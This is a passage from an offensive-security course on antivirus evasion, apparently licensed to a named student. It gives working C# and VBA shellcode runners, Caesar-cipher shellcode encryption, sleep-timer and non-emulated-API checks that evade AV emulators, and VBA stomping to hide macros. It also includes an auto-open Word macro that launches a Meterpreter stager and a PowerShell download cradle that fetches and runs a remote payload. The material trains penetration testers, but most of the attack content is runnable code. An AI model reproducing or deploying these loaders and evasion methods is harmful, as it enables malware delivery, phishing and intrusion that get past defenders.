by converting the byte array into a string with the StringBuilder291 class and its associated 
AppendFormat292 method. To obtain a string that has the same format as that generated by 
msfvenom, we’ll use a format string293 as highlighted in Listing 233. 
StringBuilder hex = new StringBuilder(encoded.Length * 2); 
foreach(byte b in encoded) 
{ 
    hex.AppendFormat("0x{0:x2}, ", b); 
} 
 
Console.WriteLine("The payload is: " + hex.ToString()); 
Listing 233 - Formatting shellcode and printing it 
Each substring starts with 0x followed by the formatted byte value. In the format string, we are 
specifying a two-digit number in hexadecimal format. Specifically, the first value of the format 
string (0:) specifies the first argument that is to be formatted, which is the byte value. The second 
part (x2) is the format specification, in which “x” indicates hexadecimal output and “2” indicates 
the number of digits in the formatted result. 
Compiling the C# project and executing it from the command line outputs our encrypted 
shellcode. 
Now we can modify our existing C# shellcode runner project by copying the encrypted shellcode 
into it and adding the decrypting routine as shown in Listing 234. Since the decryption sequence 
reverses the encryption sequence we’ll use the substitution key of 2 and subtract instead. 
byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2... 
 
for(int i = 0; i < buf.Length; i++) 
 
291 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.text.stringbuilder?view=netframework-4.8 
292 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.text.stringbuilder.appendformat?view=netframework-4.8 
293 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/standard/base-types/composite-formatting 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
178 
{ 
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF); 
} 
Listing 234 - Decryption routine 
Now, let’s test the effectiveness of this bypass technique. Since this unencrypted project 
bypassed both Avira and ClamAV, we’ll scan it with AntiScan.Me: 
 
Figure 56: Detection rate of Caesar cipher encrypted shellcode runner 
The result is impressive. Only 7 out of 26 antivirus programs flagged our code. This is a huge 
improvement over our previous attempt, which flagged 11 times. 
This proves that a custom encryption or obfuscation approach is well-suited to this task. It is 
staggering to consider how easy it can be to bypass the signature detection of these high-profile 
solutions. 
At this point, we have had relative success bypassing signature detection. In the next section, we 
will attempt to bypass heuristics detection techniques. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
179 
6.5.2.1 Exercises 
1. 
Implement the Caesar cipher with a different key to encrypt the shellcode and bypass 
antivirus. 
2. 
Use the Exclusive or (XOR)294 operation to create a different encryption routine and bypass 
antivirus. Optional: How effective is this solution? 
6.6 Messing with Our Behavior 
As previously mentioned, most antivirus products implement heuristic detection techniques that 
simulate the execution of the file in question. This behavior analysis is performed in addition to 
standard signature detection, so in this section we must bypass both techniques. 
The typical way to bypass a heuristics scan is to make the malware or stager perform some 
actions that will execute differently when emulated rather than when they are actually executed 
on the client. 
We must write code that can determine if it is being run as a simulation. If we determine that our 
code is being run in a simulator, we can simply exit the program without executing potentially 
suspect code. Otherwise, if the program is executing on the client, we can execute our intended 
code, safe from the antivirus program’s heuristic detection routine. 
6.6.1 Simple Sleep Timers 
One of the oldest behavior analysis bypass techniques revolves around time delays. If an 
application is running in a simulator and the heuristics engine encounters a pause or sleep 
instruction, it will “fast forward” through the delay to the point that the application resumes its 
actions. This avoids a potentially long wait time during a heuristics scan. 
One simple way to take advantage of this is with the Win32 Sleep295 API, which suspends the 
execution of the calling thread for the amount of time specified. If this section of code is being 
simulated, the emulator will detect the Sleep call and fast-forward through the instruction. 
If our program observes the time of day before and after the Sleep call, we can easily determine if 
the call was fast-forwarded. For example, we can inject a two-second delay, and if the time 
checks indicate that two seconds have not passed during the instruction, we assume we are 
running in a simulator and can simply exit before any suspect code is run. 
Let’s try this out. We’ll reuse the original unencrypted C# shellcode runner and insert Sleep into 
the Main method to detect time lapse. To do so we must also include the pinvoke import 
statement for Sleep: 
... 
[DllImport("kernel32.dll")] 
static extern void Sleep(uint dwMilliseconds); 
         
static void Main(string[] args) 
 
294 (Wikipedia, 2020), https://en.wikipedia.org/wiki/XOR_cipher 
295 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
180 
{ 
    DateTime t1 = DateTime.Now; 
    Sleep(2000); 
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; 
    if(t2 < 1.5) 
    { 
        return; 
    } 
... 
Listing 235 - Performing a Sleep call to evade emulation 
In this code, we use the DateTime296 object and its associated Now297 method to fetch the local 
computer’s current date and time. 
To determine the elapsed time, we use the Subtract298 method and convert this into seconds with 
the TotalSeconds property.299 
Next, we try to determine if the Sleep call has been emulated by inspecting the time lapse. In this 
case, we are testing for a lapse of 1.5 seconds to allow for inaccuracies in the time measurement. 
If the time lapse is less than 1.5 seconds, we can assume the call was emulated and simply exit 
instead of executing shellcode. 
After compiling the C# project, we find that on AntiScan.Me, 11 products flagged the C# shellcode 
runner (Figure 57), which is the same detection rate as the original: 
 
296 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.datetime?view=netframework-4.8 
297 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.datetime.now?view=netframework-4.8 
298 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.datetime.subtract?view=netframework-4.8 
299 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.timespan.totalseconds?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
181 
 
Figure 57: Detection rate of Sleep timer in unencrypted shellcode runner 
The detection rate is identical due to signature detections, so the next step is to combine the 
encrypted shellcode with the time-lapse detection. We can reuse the Caesar cipher along with the 
Sleep function to attempt a bypass of both detection mechanisms. 
By inserting the Sleep call and the time-lapse detection into the Caesar ciphered C# shellcode 
runner project, we have combined both techniques. Performing a scan with the compiled 
executable yields an interesting result: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
182 
 
Figure 58: Detection rate of Sleep timer in encrypted shellcode runner 
This time, only six products flagged our code. This is an improvement as we have bypassed 
Windows Defender detection, which is installed by default on most modern Windows-based 
systems. 
This improved evasion is rather surprising considering the Sleep function has been used for 
behavior evasion for more than a decade. We are very close to evading all the antivirus products 
supported by AntiScan.Me, so in the next section, we’ll move on to other heuristic bypass 
techniques. 
6.6.1.1 Exercises 
1. 
Implement the Sleep function to perform time-lapse detection in the C# project both with 
and without encryption. 
2. 
Convert the C# project into a Jscript file with DotNetToJscript. Is it detected? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
183 
6.6.2 Non-emulated APIs 
Antivirus emulator engines only simulate the execution of most common executable file formats 
and functions. Knowing this, we can attempt to bypass detection with a function (typically a 
Win32 API) that is either incorrectly emulated or is not emulated at all. 
In general, there are two ways of locating non-emulated APIs. The first is to reverse engineer the 
antivirus emulator, but due to the highly complex software, this will be very time consuming. A 
second, and perhaps simpler, way is to test out various APIs against the AV engine. The general 
concept is that when the AV emulator encounters a non-emulated API, its execution will fail. In 
these cases, our malicious program will have a chance to detect AV emulation by simply testing 
the API result and comparing it with the expected result. 
For example, consider the Win32 VirtualAllocExNuma300 API. The “Numa” suffix (which refers to a 
system design to optimize memory usage on multi-processor servers301) makes this a relatively 
uncommon API. 
In essence, this API allocates memory just like VirtualAllocEx but it is optimized to be used with a 
specific CPU. Obviously, this type of optimization is not required on a standard single-CPU 
workstation. 
There is no “master list” for obscure APIs, but browsing APIs on MSDN and 
reading about their intended purposes may provide clues as to how common 
they may be. 
Because of this, some antivirus vendors do not emulate VirtualAllocExNuma and, in this case, its 
execution by the AV emulator will not result in a successful memory allocation. Let’s try this out 
with a simple proof-of-concept. 
Sadly, pinvoke.net does not contain an entry for VirtualAllocExNuma, but we can compare the C 
type function prototype of VirtualAllocEx302 and VirtualAllocExNuma303 as shown in Listing 236. 
LPVOID VirtualAllocEx( 
  HANDLE hProcess, 
  LPVOID lpAddress, 
  SIZE_T dwSize, 
  DWORD  flAllocationType, 
  DWORD  flProtect 
); 
 
LPVOID VirtualAllocExNuma( 
  HANDLE hProcess, 
  LPVOID lpAddress, 
 
300 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma 
301 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/procthread/numa-support 
302 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex 
303 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
184 
  SIZE_T dwSize, 
  DWORD  flAllocationType, 
  DWORD  flProtect, 
  DWORD  nndPreferred 
); 
Listing 236 - Function prototype for VirtualAllocEx(Numa) 
In the two function prototypes above, the last argument is different and is a simple DWORD type. 
This means we can reuse the pinvoke import for VirtualAllocEx and manually add an extra 
argument of type UInt32 as shown in Listing 237: 
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,  
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); 
Listing 237 - DllImport statement for VirtualAllocExNuma 
As for VirtualALlocEx, the Numa version accepts as the first argument the handle for the process 
in which we want to allocate memory. In our case, we simply want to allocate memory in the 
address space of the currently running process. An easy way to obtain a handle to the current 
process is with the Win32 GetCurrentProcess304 API. This does not take arguments, so the import 
is rather simple as shown below in Listing 238. 
[DllImport("kernel32.dll")] 
static extern IntPtr GetCurrentProcess(); 
Listing 238 - DllImport statement for GetCurrentProcess 
The next four arguments for the Numa variant are similar to the VirtualAllocEx API, which specify 
the allocated memory address, the size of the allocation, the allocation type, and the type of 
memory protection. We can reuse the values we used previously for VirtualAllocEx and will specify 
IntPtr.Zero, 0x1000, 0x3000, and 0x4. 
Lastly, we must specify the target NUMA node for the allocation. In the case of a multiprocessing 
computer, this is essentially the CPU where the physical memory for our allocation should reside. 
Since we expect to be on a single CPU workstation, we pass a value of “0” (to specify the first 
node). 
The invocation of VirtualAllocExNuma and the subsequent emulation detection is shown below in 
Listing 239. 
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 
0); 
if(mem == null) 
{ 
    return; 
} 
Listing 239 - Calling VirtualAllocExNuma and detecting emulation 
If the API is not emulated and the code is run by the AV emulator, it will not return a valid address. 
In this case, we simply exit from the application without performing any malicious actions, similar 
to the implementation using Sleep. 
 
304 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
getcurrentprocess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
185 
We’ll insert the small simulation detection code snippet into the C# shellcode runner that uses 
Caesar cipher encryption without the Sleep call. We’ll compile it and check it against AntiScan.Me: 
 
Figure 59: Detection rate of VirtualAllocExNuma with encrypted shellcode runner 
Very nice! Our new code was only flagged by four antivirus products. 
We have managed to successfully bypass most antivirus products supported by AntiScan.Me by 
combining simple encryption and non-emulated APIs. 
Now that we’ve had success with our C# shellcode runner, we can expand our tradecraft to the 
other attack vectors including Microsoft Office documents and PowerShell. 
6.6.2.1 Exercises 
1. 
Implement a heuristics detection bypass with VirtualAllocExNuma. 
2. 
Use the Win32 FlsAlloc305 API to create a heuristics detection bypass. 
3. 
Experiment and search for additional APIs that are not emulated by antivirus products. 
 
305 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
186 
6.7 Office Please Bypass Antivirus 
We have performed an extensive and thorough analysis of how to bypass antivirus detections 
both in theory and in practice as it relates to our C# shellcode runner. Next, we’ll turn our attention 
to Microsoft Office and attempt to evade antivirus when using VBA macros. 
6.7.1 Bypassing Antivirus in VBA 
To begin, let’s scan our existing VBA shellcode runner with AntiScan.Me. 
The complete VBA macro is repeated in Listing 240 for ease of reference: 
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr 
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
Long) As LongPtr 
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr 
 
Function mymacro() 
    Dim buf As Variant 
    Dim addr As LongPtr 
    Dim counter As Long 
    Dim data As Long 
    Dim res As Long 
     
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 
12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 
193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 
227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 
214, 49, 255, 172, 193, _ 
... 
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 
104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 
114, 111, 106, 0, 83, 255, 213) 
 
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 
    For counter = LBound(buf) To UBound(buf) 
        data = buf(counter) 
        res = RtlMoveMemory(addr + counter, data, 1) 
    Next counter 
     
    res = CreateThread(0, 0, addr, 0, 0, 0) 
 
Sub Document_Open() 
    mymacro 
End Sub 
 
Sub AutoOpen() 
    mymacro 
End Sub 
Listing 240 - Full VBA script to execute Meterpreter staged payload in memory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
187 
When we save this code in a document and scan it with AntiScan.Me, we find that it is detected 
by seven products: 
 
Figure 60: Detection rate for VBA shellcode runner 
Although this is a better result than the original C# shellcode runner (which was detected by 11 
products), let’s try to improve our results by encrypting the shellcode with a Caesar cipher. To do 
this, we’ll need to encrypt the shellcode in an output format suitable for VBA. 
We’ll reuse the previous C# project to encrypt the shellcode and then copy the encrypted result 
into the VBA macro. For a VBA format, we’ll use decimal values instead of hexadecimal as noted 
at line number 12 of the listing below. We’ll then split the encrypted shellcode on multiple lines at 
line number 16 in order to handle the maximum size issues of literal strings: 
1   byte[] encoded = new byte[buf.Length]; 
2   for(int i = 0; i < buf.Length; i++) 
3   { 
4     encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); 
5   } 
6  
7   uint counter = 0; 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
188 
8  
9   StringBuilder hex = new StringBuilder(encoded.Length * 2); 
10  foreach(byte b in encoded) 
11  { 
12    hex.AppendFormat("{0:D}, ", b); 
13    counter++; 
14    if(counter % 50 == 0) 
15    { 
16        hex.AppendFormat("_{0}", Environment.NewLine); 
17    } 
18  } 
19  Console.WriteLine("The payload is: " + hex.ToString()); 
Listing 241 - Caesar cipher encryption routine 
The encryption code itself remains unchanged and at line 14, we’ve inserted a newline for every 
50 byte values with a modulo 50 statement. 
When executing the VBA shellcode runner, we must also implement a decryption routine. Luckily, 
this is even easier than in C#, as shown in Listing 242: 
For i = 0 To UBound(buf) 
    buf(i) = buf(i) - 2 
Next i 
Listing 242 - Caesar decryption routine in VBA 
After inserting the encrypted shellcode and the decryption routine, our detection rate is 7 out of 26 
products: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
189 
 
Figure 61: Detection rate for encrypted VBA shellcode runner 
In this case, the encrypted shellcode did not provide a significant reduction. 
Let’s try to improve our results by inserting a time-lapse. 
We’ll import the Sleep function to implement time-lapse detection into our encrypted VBA 
shellcode runner: 
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long 
... 
Dim t1 As Date 
Dim t2 As Date 
Dim time As Long 
 
t1 = Now() 
Sleep (2000) 
t2 = Now() 
time = DateDiff("s", t1, t2) 
 
If time < 2 Then 
    Exit Function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
190 
End If 
... 
Listing 243 - Using Sleep function to detect antivirus emulator 
This is a direct port from C# to VBA using the Now function306 to obtain the current date and time, 
represented as a Date307 object, before and after the Sleep call. 
To calculate the elapsed number of seconds, we use the DateDiff function,308 specifying the 
output as seconds through a String expression in the first argument with a value of “s”, followed 
by the two recorded Date objects. 
Testing the updated Microsoft Word document through AntiScan.Me yields a surprisingly 
unchanged detection rate of 7 out of 26. 
Given how effective the heuristics bypass technique was with C#, the issue is likely related to 
signature detection. This makes sense given the popularity of Microsoft Office documents among 
malware authors. Given the common usage of this attack vector, antivirus vendors have invested 
significant time and effort into detecting this. 
To reduce the detection rate, we’ll turn to a recent bypass technique that is specific to Microsoft 
Office. 
6.7.1.1 Exercises 
1. 
Implement the Caesar cipher encryption and time-lapse detection in a VBA macro. 
2. 
Attempt to reduce the detection rate further by using a different encryption algorithm and 
routine along with alternative heuristic bypasses. 
6.7.2 Stomping On Microsoft Word 
Security research was released in 2018 discussing how VBA code is stored in Microsoft Word 
and Excel macros and it can be abused.309 In this section, we will investigate this topic and 
leverage this technique to reduce our detection rates. 
To begin, we must inspect our existing shellcode runner more closely, and this requires some 
custom tools. 
The Microsoft Office file formats used in documents with .doc and .xls extensions rely on the very 
old and partially-documented proprietary Compound File Binary Format,310 which can combine 
multiple files into a single disk file. 
On the other hand, more modern Microsoft Office file extensions, like .docm and .xlsm, describe 
an updated and more open file format that is not dissimilar to a .zip file. 
 
306 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function 
307 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/date-function 
308 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/datediff-function 
309 (Carrie Roberts, 2019), https://github.com/clr2of8/Presentations/blob/master/DerbyCon2018-VBAstomp-Final-WalmartRedact.pdf 
310 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cfb/53989ce4-7b05-4f8d-829b-
d08d6148375b 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
191 
 
Word and Excel documents using the modern macro-enabled formats can be 
unzipped with 7zip and the contents inspected in a hex editor. 
There are no official tools for unwrapping .doc files, so we’ll turn to the third party FlexHEX311 
application, which is pre-installed on the Windows 10 development machine. Let’s use this tool to 
inspect our most recent revision of the VBA shellcode runner. 
First, we’ll open FlexHEX and navigate to File > Open > OLE Compound File… as shown in Figure 
62. 
 
Figure 62: Using FlexHEX to open a Microsoft Word file 
In the new file browser window, we’ll locate the Microsoft Word document and open it. Notice the 
lower-left Navigation window. If we expand the Macro and VBA folders, we obtain the view shown 
in Figure 63. 
 
311 (Inv Softworks LLC, 2020), http://www.flexhex.com/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
192 
 
Figure 63: Using FlexHEX to open a Microsoft Word file 
This view shows all the embedded files and folders included in the document. Any content related 
to VBA macros are located in the Macros folder highlighted above. 
For Microsoft Word or Excel documents using the newer macro enabled formats, 
all macro-related information is stored in the vbaProject.bin file inside the zipped 
archive. 
The first file worth inspecting is PROJECT, which contains project information. The graphical VBA 
editor also determines which macros to show based on the contents of this file. If we click this 
file in the Navigator window, the content is displayed in the upper-left window. 
As 
highlighted 
below 
in 
Figure 
64, 
the 
binary 
content 
contains 
the 
ASCII 
line 
“Module=NewMacros”, which is what the GUI editor uses to link the displayed macros. 
 
Figure 64: VBA editor macro link - “Module=NewMacros”" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
193 
 
If we could remove this link in the editor, it could hide our macro from within the graphical Office 
VBA editor. To remove this link in the graphical editor, we can simply remove the line by replacing 
it with null bytes. This is done by highlighting the ASCII string and navigating to Edit > Insert Zero 
Block, which opens a new window (Figure 65). We can save the change by clicking OK. 
 
Figure 65: Removing the editor macro link 
With the null bytes saved, we’ll close FlexHEX to recompress the file. 
Figure 66 shows the view from the Office VBA editor before editing on the left and the result of 
the edit on the right side. 
 
Figure 66: Missing macro in VBA editor 
This helps prevent manual detection, but AntiScan.Me reports that we have not reduced the 
detection rate since the macro still exists and will still be executed. However, if we could 
somehow remove the macro yet still have it execute, we may enjoy a significant reduction in our 
detection rate. 
To understand how this unlikely scenario is possible, we must dig deeper into the implementation 
of VBA code. The key concept here is PerformanceCache,312 which is a structure present in both 
_VBA_PROJECT and NewMacros as repeated in Figure 67. 
 
312 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-
7dba2214d239 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
194 
 
Figure 67: VBA_PROJECT and NewMacros 
Inspecting the documentation reveals that this signifies a cached and compiled version of the 
VBA textual code, known as P-code. The P-code is a compiled version of the VBA textual code for 
the specific version of Microsoft Office and VBA it was created on. 
To explain it differently, if a Microsoft Word document is opened on a different computer that 
uses the same version and edition of Microsoft Word, the cached pre-compiled P-code is 
executed, avoiding the translation of the textual VBA code by the VBA interpreter. 
Using FlexHEX, we can view the P-code inside the NewMacros file as shown in Figure 68. 
 
Figure 68: P-code in Microsoft Word document 
In the right-side pane, we notice the Win32 API names inside the compiled P-code, while the rest 
of the code is in a pure binary format. 
If the document is opened on a different version or edition of Microsoft Word, the P-code is 
ignored and the textual version of the VBA is used instead. This is also located within NewMacros 
in a variable called CompressedSourceCode.313 
 
313 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/c66b58a6-f8ba-4141-9382-
0612abce9926 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
195 
Scrolling towards the bottom of NewMacros, we find a partially-compressed version of the VBA 
source code as shown in Figure 69. 
 
Figure 69: VBA source code in Microsoft Word 
Even partially compressed, we notice the Win32 API imports in the highlighted part of Figure 69 
following the statement Attribute VB_Name = “New Macros”. The remaining part of the VBA code 
follows if we were to scroll even further down. 
In regards to this cached P-Code, we need to understand how Microsoft Word determines the 
version and edition a specific document was created with. A clue lies at the beginning of the 
_VBA_PROJECT file as displayed in Figure 70: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
196 
 
Figure 70: Microsoft Office and VBA version 
From the two highlighted sections, we notice that the P-code in this document will be compiled 
for Office 16. This indicates Microsoft Office 2016, which uses VBE7.DLL and is installed in the 
32-bit version folder (C:\Program Files(x86)). This matches our current environment. 
As long as our document is opened on a computer that uses the same version of Microsoft Word 
installed in the default location, the VBA source code is ignored and the P-code is executed 
instead. This means that in some scenarios, the VBA source code can be removed, which could 
certainly help us bypass detection. 
As we will demonstrate, only a few antivirus products actually inspect the P-code at all. This 
concept of removing the VBA source code has been termed VBA Stomping. 
Let’s perform this evasion technique with our encrypted shellcode runner by locating the VBA 
source code inside NewMacros as previously shown. We need to mark the bytes that start with 
the ASCII characters “Attribute VB_Name” as shown in Figure 71 and select all the remaining 
bytes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
197 
 
Figure 71: Marking VBA source code 
The end of the p-code will be the very last byte as shown in Figure 72. 
 
Figure 72: Marking to the end of the VBA source code 
With the VBA source code selected, we’ll navigate to Edit > Insert Zero Block and accept the size 
of modifications. The start of the modified VBA source code is displayed in Figure 73. 
 
Figure 73: Modified VBA source code 
Once the VBA source code has been stomped, we’ll save the Microsoft Word document and close 
FlexHEX to allow it to be re-compressed. 
If we open the Word document, we’ll notice the “Enable Content” security warning but if we open 
the VBA editor, we’ll find that the NewMacro container is completely empty (Figure 74). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
198 
 
Figure 74: Stomped Word document 
Visually, the VBA macro seems to have been completely removed. When we accept the security 
warning and let the VBA macro execute, we notice two things. First, we obtain a reverse 
Meterpreter shell, which demonstrates that even with the VBA source code removed, the P-code 
is executed and the attack still works. 
Second, the VBA source code has reappeared inside the VBA editor as shown in Figure 75. 
Microsoft Word decompiled the P-code and wrote it back into the editor while executing it. 
 
Figure 75: P-code reappears in VBA editor 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
199 
 
Since the Microsoft Word document still yields us code execution, the most pressing question is, 
does this reduce antivirus detection rates? AntiScan.Me reports an improved detection rate of 
only four flags, down from seven in our last scan (Figure 76). 
 
Figure 76: AntiScan.Me detection of stomped VBA document 
This is a decent detection rate, especially considering that this is one of the most commonly used 
document types used in phishing attacks and we have embedded a very widely-used shellcode 
stager. 
Abusing the Microsoft Office file format to obfuscate the shellcode is a relatively new concept 
and parts of the file format are still undocumented so it is quite possible that other evasion 
techniques have so far gone undiscovered. 
It is important that we target the correct version of Office when we perform VBA stomping, 
otherwise the VBA code will fail to execute entirely. 
In this section, we have examined detection rates and possible evasions while having the 
shellcode runner inside the VBA macro. Next, we will further reduce our detection rates by once 
again staging with PowerShell. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
200 
6.7.2.1 Exercises 
1. 
Use FlexHex to delve into the file format of Microsoft Word as explained in this section. 
2. 
Manually stomp out a Microsoft Word document and verify that it still works while improving 
evasion. 
3. 
Use the Evil Clippy314 tool (located in C:\Tools\EvilClippy.exe) to automate the VBA Stomping 
process. 
6.8 Hiding PowerShell Inside VBA 
We have previously used the powerful combination of PowerShell and Microsoft Office in a client-
side attack. In this section, we will use this powerful combination to further reduce our detection 
rates. 
6.8.1 Detection of PowerShell Shellcode Runner 
One of the advantages of using the PowerShell shellcode runner is the fact that no first-stage 
shellcode is embedded in the document that is sent to the victim. 
We accomplished this with a PowerShell download cradle that fetched and executed the full 
shellcode. A recap of that code is shown in Listing 244. 
Sub MyMacro() 
  Dim strArg As String 
  strArg = "powershell -exec bypass -nop -c iex((new-object 
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))" 
  Shell strArg, vbHide 
End Sub 
Listing 244 - Basic PowerShell shellcode runner 
Since this code contains no shellcode, we would expect a very low signature detection rate. 
However, this code is flagged by eight products (Figure 77), which is surprisingly higher than a 
Microsoft Word document containing an unencrypted Meterpreter shellcode. 
 
314 (Stan Hegt, 2019), https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
201 
 
Figure 77: Detection rate of PowerShell shellcode runner 
There are two main issues that cause the high detection rate: the use of the Shell method and the 
clearly identifiable PowerShell download cradle. Let’s address Shell first. 
When the PowerShell process is created directly from the VBA code through Shell, it becomes a 
child process of Microsoft Word. This is suspicious behavior and we can not easily obfuscate this 
VBA function name. In the next sections, we will attempt to solve both of the issues mentioned 
above. 
6.8.1.1 Exercises 
1. 
Perform a scan of the PowerShell download cradle and shellcode runner. 
2. 
What is the detection rate when the PowerShell instead downloads a pre-compiled C# 
